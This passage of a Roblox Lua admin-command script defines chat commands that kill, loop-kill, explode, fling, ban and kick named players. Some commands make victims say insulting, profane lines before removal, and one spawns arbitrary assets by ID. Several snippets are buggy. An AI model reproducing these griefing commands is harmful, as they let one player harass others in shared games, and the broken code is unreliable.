CoolCMDs.Functions.CreateCommand("dome", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do
local player = matchPlayer(word)
if (player ~= nil) then
if (player.Character ~= nil) then
if (player.Character:FindFirstChild("Torso") ~= nil) then
Dome = Game:GetService("InsertService"):LoadAsset(61208040)["DaviDome"]
Dome.Parent = Game.Workspace
Dome:MakeJoints()
Dome:MoveTo(player.Character.Torso.Position)
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("train", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do
local player = matchPlayer(word)
if (player ~= nil) then
if (player.Character ~= nil) then
if (player.Character.Parent ~= nil) then
if (player.Character.Parent == Workspace) then
if (player.Character:FindFirstChild("Torso") ~= nil) then
if (player.Character:FindFirstChild("Humanoid") ~= nil) then
Train = Game:GetService("InsertService"):LoadAsset(61202034)["_Train"]
Train.Parent = Game.Workspace
Train:MakeJoints()
Train:MoveTo(player.Character.Torso.Position + Vector3.new(math.random(10, 20), -3, math.random(10, 20)))
player.Character:MoveTo(Train.TeleTo.Position + Vector3.new(0, 5, 0))
player.Character.Humanoid.WalkSpeed = 0
end
end
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("telamon", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then
if (player.Character ~= nil) then
player.Character:BreakJoints()
end
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=261"
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("noob", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do
local player = matchPlayer(word)
if (player ~= nil) then
if (player.Character ~= nil) then
player.Character:BreakJoints()
end
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=9676343"
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("giant", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then
if (player.Character ~= nil) then
size(player.Character, 2)
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("mini", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then
if (player.Character ~= nil) then
size(player.Character, .5)
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("zombie", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then
if (player.Character ~= nil) then
if (player.Character:FindFirstChild("Animate") ~= nil) then
player.Character.Animate:Remove()
end
if (player.Character:FindFirstChild("Torso") ~= nil) then
player.Character.Torso["Left Shoulder"].DesiredAngle = (-1.5)
player.Character.Torso["Right Shoulder"].DesiredAngle = (1.5)
end
local M = Game:GetService("InsertService"):LoadAsset(60262835)["Animate"]
M.Parent = player.Character
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unblind", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then
if (player:FindFirstChild("PlayerGui") ~= nil) then
if (player.PlayerGui:FindFirstChild("BlindGui") ~= nil) then
player.PlayerGui.BlindGui:Remove()
end
end
end
end
end, "None", "None", "None")
--[[
CoolCMDs.Functions.CreateCommand("blind", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then
if (player:FindFirstChild("PlayerGui") ~= nil) then
local Gui = Instance.new("ScreenGui")
Gui.Parent = player.PlayerGui
Gui.Name = "BlindGui"
local Frame = Instance.new("Frame")
Frame.Parent = Gui
Frame.Name = "Frame" --Trolololol
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundColor3 = Color3.new(0, 0, 0)
end
end
end
end, "None", "None", "None")
--]]
CoolCMDs.Functions.CreateCommand("o/debug", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then
if (player:FindFirstChild("Backpack") ~= nil) then
if (player.Character ~= nil) then
player.Character:BreakJoints()
end
player.CharacterAppearance = "http://www.roblox.com/asset/?ID=5411523"
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("suit", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then
if (player:FindFirstChild("Backpack") ~= nil) then
if (player.Character ~= nil) then
player.Character:BreakJoints()
end
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=19451007"
local M = Game:GetService("InsertService"):LoadAsset(60213688)["Weapons"]
Tag = Game:FindFirstChild("ControlFrame", true)
M.Parent = Tag
M.Speaker.Value = Name
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("fan", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then
if (player.Character ~= nil) then
player.Character:BreakJoints()
end
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=13873198"
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("g/debug", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then
if (player.Character ~= nil) then
player.Character:BreakJoints()
end
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=1"
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("p/debug", 5, function(msg, MessageSplit, Speaker, Self)
Speaker.Character:BreakJoints() 
Speaker.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=" ..string.sub(msg,12) 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("clone", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character ~= nil) then
if (player.Character:FindFirstChild("Head") ~= nil) then
player.Character.Archivable = true
local Clone = player.Character:Clone()
Clone.Parent = Workspace
Clone:MakeJoints()
Clone:MoveTo(player.Character.Head.Position + Vector3.new(0, 10, 0))
end 
end 
end 
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("re", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
local model = Instance.new("Model")
model.Parent = Workspace
local torso = Instance.new("Part")
torso.Transparency = 1
torso.CanCollide = false
torso.Anchored = true
torso.Name = "Torso"
torso.Position = Vector3.new(10000, 10000, 10000)
torso.Parent = model
local human = Instance.new("Humanoid")
human.Torso = torso
human.Parent = model
player.Character = model
end 
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("age", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
local M = Instance.new("Message")
M.Parent = Workspace
M.Text = player.Name.. "'s account age is " ..player.AccountAge.. "!"
wait(3)
M:Remove()
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("loopkill", 5, function(msg, MessageSplit, Speaker, Self)
local number = msg:match("[%d%.]+")
if (number ~= nil) then 
for i = 1, number do
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character ~= nil) then
player.Character:BreakJoints()
end
end
end
wait(6)
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("speed", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
local number = msg:match("[%d%.]+")
if (number ~= nil) then 
if (player ~= nil) then 
if (player.Character ~= nil) then
if (player.Character:FindFirstChild("Humanoid") ~= nil) then
player.Character.Humanoid.WalkSpeed = tonumber(number)
end 
end 
end 
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("health", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
local number = msg:match("[%d%.]+")
if (number ~= nil) then 
if (player ~= nil) then 
player.Character.Humanoid.Health = tonumber(number)
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unbanland", 5, function(msg, MessageSplit, Speaker, Self)
Player = string.sub(msg, 5)
for i = 1, #Banned do
if Player:lower() == Banned[i]:lower() then
table.remove(Banned, Player)
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("banland", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then
if (player.Character ~= nil) then  
if player.Character:FindFirstChild("Head") ~= nil then
Game:GetService("Chat"):Chat(player.Character.Head, "I am a r3jected noob, so I will now leave and never return!", "Red")
wait(3)
end
end
table.insert(Banned, player.Name)
player:Remove()
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("k", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character ~= nil) then  
if player.Character:FindFirstChild("Head") ~= nil then
Game:GetService("Chat"):Chat(player.Character.Head, "I am a Fu*k*ng noob, so I will now leave.", "Red")
wait(3)
end
end
player:Remove()
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("meteors", 5, function(msg, MessageSplit, Speaker, Self)
meteornum = 200
time = 5
local S = Instance.new("Sound")
S.Parent = Workspace
S.Name = "Sound"
S.SoundId = "http://www.roblox.com/asset/?id=15666462"
S.Volume = 1
S.Looped = false
S.archivable = false
local T = Instance.new("Sound")
T.Parent = Workspace
T.Name = "Sound"
T.SoundId = "http://www.roblox.com/asset/?id=1015394"
T.Volume = 1
T.Looped = true
T.archivable = false
---------------------------------------
for i = 1, time do
local M = Instance.new("Message")
M.Parent = Workspace
M.Text = "Warning: METEOR SHOWER APPROACHING!... it will hit in about " ..time.. " seconds!"
wait(1)
time = time - 1
S:Play()
M:Remove()
end
---------------------------------------
T:Play()
local M = Instance.new("Message")
M.Parent = Workspace
M.Text = "It will be all over soon  >:D"
wait(3)
M:Remove()
---------------------------------------
for i = 1, meteornum do
local p = Instance.new("Part")
p.Parent = Workspace
p.Position = Vector3.new(math.random(-256, 256), 300, math.random(-256, 256))
p.Name = "Meteor"
p.Size = Vector3.new(30, 10, 27)
p.BrickColor = BrickColor.Red()
p.Material = ("Slate")
function onTouched(hit)
hit:BreakJoints()
end
p.Touched:connect(onTouched)
wait(.25)
end
for i,v in pairs(Workspace:GetChildren()) do 
if v.Name == "Meteor" then 
v:Remove()
M:Remove()
end 
end 
T:Stop()
T:Remove()
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("explode", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player.Character ~= nil then
if player.Character:FindFirstChild("Head") ~= nil then
SavedPos = player.Character.Head.Position
local e = Instance.new("Explosion")
e.Parent = Workspace
e.BlastPressure = 1000000
e.BlastRadius = 15
e.Position = player.Character.Head.Position
local Bubble = Instance.new("Part")
Bubble.Parent = Workspace
Bubble.Position = player.Character.Head.Position
Bubble.Size = Vector3.new(5, 5, 5)
Bubble.formFactor = ("Symmetric")
Bubble.Transparency = .3
Bubble.BrickColor = BrickColor.new("Bright yellow")
Bubble.TopSurface = ("Smooth")
Bubble.BottomSurface = ("Smooth")
Bubble.Shape = ("Ball")
Bubble.CanCollide = false
Bubble.Anchored = true
local QuickScript = game:service("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript.Name = "RotationScript"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
for i = 1, 100 do
SavedPos = script.Parent.Position
script.Parent.Size = script.Parent.Size + Vector3.new(.2, .2, .2)
script.Parent.Transparency = script.Parent.Transparency + .01
script.Parent.CFrame = CFrame.new(SavedPos)
for i, v in pairs(Players:GetChildren()) do
if v.Character ~= nil then
if v.Character:FindFirstChild("Head") ~= nil then
if (v.Character.Head.Position - script.Parent.Position).magnitude < script.Parent.Size.X / 2
v.Character:BreakJoints()
v.Character.Head:Remove()
end
end
end
end
wait()
end
]]
QuickScript.Parent = Bubble
end
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("exshank", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player.Character ~= nil then
if player.Character:FindFirstChild("Head") ~= nil then
local P = Instance.new("Part")
P.Parent = player.Character
P.Size = Vector3.new(3, 1, 1)
P.Position = player.Character.Head.Position
P.CFrame = player.Character.Head.CFrame
P.Name = "Sword"
P.CanCollide = false
P.Anchored = true
m = Instance.new("SpecialMesh")
m.MeshType = "FileMesh"
m.MeshId = "rbxasset://fonts/sword.mesh"
m.Scale = Vector3.new(2,2,2)
m.Parent = P
local QuickScript = game:service("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript.Name = "PlaySound"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
local Sound = Instance.new("Sound")
Sound.Pitch = 1.5
Sound.Volume = 1
Sound.SoundId = "http://www.roblox.com/Asset/?id=15666462"
Sound.Parent = script.Parent.Head
Tock = .5
for i = 1, 9 do
Sound:Play()
wait(Tock)
Tock = Tock - .1
end
script:Remove()
]]
QuickScript.Parent = player.Character
local QuickScript = game:service("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript.Name = "PlaySound"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
while true do
script.Parent.Sword.CFrame = CFrame.new(script.Parent.Head.Position)
wait()
end
]]
QuickScript.Parent = player.Character
wait(2)
if player.Character ~= nil then
if player.Character:FindFirstChild("Head") ~= nil then
local e = Instance.new("Explosion")
e.Parent = Workspace
e.Position = player.Character.Head.Position
e.BlastPressure = 50000
e.BlastRadius = 15
else
player.Character:BreakJoints()
end
end
P:Remove()
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("breakbase", 5, function(msg, MessageSplit, Speaker, Self)
if Workspace:FindFirstChild("ABreakBase") == nil then
if Workspace:FindFirstChild("Base") ~= nil then
Workspace.Base:Remove()
end
for i,v in pairs(Workspace:GetChildren()) do 
if v:IsA("BasePart") then 
v:Remove() 
end 
end 
local V = Instance.new("IntValue")
V.Name = "ABreakBase"
V.Parent = Workspace
V.Value = 0
local Total = 1000 
local SpawnPos = Vector3.new(0,0.2,0)

local Brick = Instance.new("Part")
Brick.FormFactor = 2
Brick.Size = Vector3.new(10,0.4,10)
Brick.Anchored = true
Brick.BrickColor = BrickColor.Green()
---
local Pos = SpawnPos + Vector3.new(Brick.Size.x / 2,0,0)
local Model = Workspace
---
for X = 1, math.sqrt(Total) / 2 do
local BPos = Pos + Vector3.new(0,0,Brick.Size.z / 2)
for X = 1, math.sqrt(Total) / 2 do
local Part = Brick:clone()
Part.Parent = Model
Part.CFrame = CFrame.new(BPos)
BPos = BPos + Vector3.new(0,0,Brick.Size.z)
end
local BPos = Pos - Vector3.new(0,0,Brick.Size.z / 2)
for X = 1, math.sqrt(Total) / 2 do
local Part = Brick:clone()
Part.Parent = Model
Part.CFrame = CFrame.new(BPos)
BPos = BPos - Vector3.new(0,0,Brick.Size.z)
end
Pos = Pos + Vector3.new(Brick.Size.x,0,0)
end
local Pos = SpawnPos - Vector3.new(Brick.Size.x / 2,0,0)
for X = 1, math.sqrt(Total) / 2 do
local BPos = Pos + Vector3.new(0,0,Brick.Size.z / 2)
for X = 1, math.sqrt(Total) / 2 do
local Part = Brick:clone()
Part.Parent = Model
Part.CFrame = CFrame.new(BPos)
BPos = BPos + Vector3.new(0,0,Brick.Size.z)
end
local BPos = Pos - Vector3.new(0,0,Brick.Size.z / 2)
for X = 1, math.sqrt(Total) / 2 do
local Part = Brick:clone()
Part.Parent = Model
Part.CFrame = CFrame.new(BPos)
BPos = BPos - Vector3.new(0,0,Brick.Size.z)
end
Pos = Pos - Vector3.new(Brick.Size.x,0,0)
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("shank", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player.Character ~= nil then
if player.Character:FindFirstChild("Head") ~= nil then
local P = Instance.new("Part")
P.Parent = player.Character
P.Size = Vector3.new(3, 1, 1)
P.Position = player.Character.Head.Position
P.CFrame = player.Character.Head.CFrame
P.Name = "Sword"
P.CanCollide = false
P.Anchored = true
m = Instance.new("SpecialMesh")
m.MeshType = "FileMesh"
m.MeshId = "rbxasset://fonts/sword.mesh"
m.Scale = Vector3.new(2,2,2)
m.Parent = P
local QuickScript = game:service("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript.Name = "PlaySound"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
while true do
script.Parent.Sword.CFrame = CFrame.new(script.Parent.Head.Position)
wait()
end
]]
QuickScript.Parent = player.Character
wait(2)
if player.Character ~= nil then
if player.Character:FindFirstChild("Head") ~= nil then
player.Character.Head:Remove()
else
player.Character:BreakJoints()
end
end
P:Remove()
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("id", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
local M = Instance.new("Message")
M.Parent = Workspace
M.Text = "Hey master " ..Speaker.Name.. ", did you know that " ..player.Name.. "'s userId is " ..player.userId.. "?" 
wait(5)
M:Remove()
end 
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("drain", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
for i = 1, 50 do
if player.Character ~= nil then
if player.Character:FindFirstChild("Humanoid") ~= nil then
player.Character.Humanoid.Health = player.Character.Humanoid.Health - 2
if Speaker.Character.Humanoid.Health == Speaker.Character.Humanoid.MaxHealth then
Speaker.Character.Humanoid.MaxHealth = Speaker.Character.Humanoid.MaxHealth + 100
end
Speaker.Character.Humanoid.Health = Speaker.Character.Humanoid.Health + 2
wait(.1)
end
end
end 
end
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ufo", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if (player.Character ~= nil) then
if (player.Character:FindFirstChild("Head") ~= nil) then
local M = Game:GetService("InsertService"):LoadAsset(60188642)["UFO"]
M.Parent = Workspace
M:MakeJoints()
for i = 1, 2000 do
M.Main.BodyPosition.position = Vector3.new(player.Character.Head.Position.X, UFO.BodyPosition.position.Y, player.Character.Head.Position.Z)
wait()
end
M:Remove()
end
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("preserve", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player.Character ~= nil then
if player.Character:FindFirstChild("Torso") ~= nil then
Torso = player.Character.Torso
local Bubble = Instance.new("Part")
Bubble.Parent = Workspace
Bubble.Position = Torso.Position
Bubble.Size = Vector3.new(15, 15, 15)
Bubble.formFactor = ("Symmetric")
Bubble.Transparency = .7
Bubble.BrickColor = BrickColor.new("Cyan")
Bubble.TopSurface = ("Smooth")
Bubble.BottomSurface = ("Smooth")
Bubble:BreakJoints()
local Weld = Instance.new("Weld")
Weld.Parent = Bubble
Weld.Part0 = Bubble
Weld.Part1 = Torso
Bubble.CFrame = Torso.CFrame
end
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("fling", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player.Character ~= nil then
if player.Character:FindFirstChild("Torso") ~= nil then
Torso = player.Character.Torso
Torso.RotVelocity = Vector3.new(math.random(-500, 500), math.random(500, 600), 0)
local QuickScript = game:service("InsertService"):LoadAsset(54471119)["QuickScript"]
QuickScript.Name = "FatalLandingScript"
QuickScript.Debug:Remove()
QuickScript.NewSource.Value = [[
wait(.5)
-----
function onTouched(hit)
if (hit ~= nil) then
if hit:IsA("BasePart") then
script.Parent:BreakJoints()
end
end
end
-----
script.Parent.Touched:connect(onTouched)
]]
QuickScript.Parent = player.Character.Torso
if player.Character:FindFirstChild("Humanoid") ~= nil then
player.Character.Humanoid.PlatformStand = true
end
end
end 
end 
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("bubble", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player.Character ~= nil then
if player.Character:FindFirstChild("Torso") ~= nil then
Torso = player.Character.Torso
local Bubble = Instance.new("Part")
Bubble.Parent = Workspace
Bubble.Position = Vector3.new(0, 0, 0)
Bubble.Size = Vector3.new(10, 10, 10)
Bubble.Shape = ("Ball")
Bubble.Transparency = .4
Bubble.BrickColor = BrickColor.Blue()
Bubble.TopSurface = ("Smooth")
Bubble.BottomSurface = ("Smooth")
Bubble:BreakJoints()
local Weld = Instance.new("Weld")
Weld.Parent = Bubble
Weld.Part0 = Bubble
Weld.Part1 = Torso
Bubble.CFrame = Torso.CFrame
local BF = Instance.new("BodyForce")
BF.Parent = Bubble
BF.force = Vector3.new(0, 112500, 0)
if player.Character:FindFirstChild("Humanoid") ~= nil then
player.Character.Humanoid.PlatformStand = true
end
end
end 
end 
end
end, "None", "None", "None")
--[[
CoolCMDs.Functions.CreateCommand("jail", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
if player.Character ~= nil then
if player.Character:FindFirstChild("Torso") ~= nil then
p = Game:GetService("InsertService"):LoadAsset(60003029)["Jail"]
p.Parent = Workspace 
p:MakeJoints() 
p:MoveTo(player.Character.Torso.Position) 
player.Character:MoveTo(p.CUB.Position + Vector3.new(0, 3, 0))
end
end
end 
end 
end, "None", "None", "None")
--]]

CoolCMDs.Functions.CreateCommand("chat/on", 5, function(msg, MessageSplit, Speaker, Self)
Chat = true
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("chat/off", 5, function(msg, MessageSplit, Speaker, Self)
Chat = false
end, "None", "None", "None")

--[[
--Davbot Chat Head
if Chat == true then
if Speaker.Character:FindFirstChild("Head") ~= nil then
Game:GetService("Chat"):Chat(Speaker.Character.Head, msg, "Green")
end
end
--]]

--Davbot commands end :(

--Orb Commands Start (ones with InsertService don't work)

CoolCMDs.Functions.CreateCommand("mdebug", 5, function(msg, MessageSplit, Speaker, Self)
local dbg = game.Workspace:getChildren()
for i=1,#dbg do
if dbg[i].className == "Hint" or dbg[i].className == "Message" then
dbg[i]:remove()
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("gfm", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
local number = msg:match("[%d%.]+") 
if (number ~= nil) then 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(tonumber(number)) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
wait(1) 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("walkspeed", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
local number = msg:match("[%d%.]+") 
if (number ~= nil) then 
if (player ~= nil) then 
player.Character.Humanoid.WalkSpeed = tonumber(number)
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("damage", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
local number = msg:match("[%d%.]+") 
if (number ~= nil) then 
if (player ~= nil) then 
player.Character.Humanoid.Health = tonumber(number)
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("control", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
Speaker.Character = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("respawn", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
local model = Instance.new("Model")
model.Parent = game.Workspace
local torso = Instance.new("Part")
torso.Transparency = 1
torso.CanCollide = false
torso.Anchored = true
torso.Name = "Torso"
torso.Position = Vector3.new(10000,10000,10000)
torso.Parent = model
local human = Instance.new("Humanoid")
human.Torso = torso
human.Parent = model
player.Character = model
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("icc", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37681988) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ab", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(39348506) 
g.Parent = player.Character 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("safeb", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(39348631) 
g.Parent = player.Character 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("makeorb", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(44709620) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("gui", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37673876) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("admg", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37682962) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("snake", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(44707124) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("house", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(44707260) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("assasin", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(40848777) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("camove", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(39035199) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("blade", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(39033468) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("rc", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(39167741) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("explorer", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41088196) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("insert2", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41088141) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("gravgun", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(44706943) 
g.Parent = game.Workspace 
